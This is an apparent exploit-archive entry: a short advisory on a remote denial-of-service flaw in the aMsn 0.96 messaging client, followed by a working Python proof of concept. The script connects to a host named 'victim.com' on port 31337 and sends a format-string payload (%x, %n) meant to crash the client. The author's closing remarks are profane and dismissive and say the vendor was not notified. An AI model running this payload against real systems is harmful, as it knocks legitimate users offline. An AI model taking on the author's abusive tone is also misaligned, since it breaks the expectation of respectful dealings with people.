source: http://www.securityfocus.com/bid/23583/info

aMsn is prone to a remote denial-of-service vulnerability because the application fails to handle exceptional conditions.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.

This issue affects aMsn 0.96 and prior versions.

import socket

HOST = 'victim.com'
PORT = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
i = 1
while i <= 3:
   s.send('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\
          ?!"?$%&/()=?`#+#-.,;:_??????%X%X%X%X%X%XXX%X%x%x%x%x%x%x%x%x%x%n%n%n\
          %n%n%n%n%n%n\????#?[{#?]?#\`~??')

---fuck off here---

I think it were the character '}', '{' or '%x', '%n'. Try to determine this for
yourself! Don't bug me with this shit.

/* Vendor contacted? */
NO! Why should I contact them? :) lol, go away and contact them yourself.

/* EOF */ 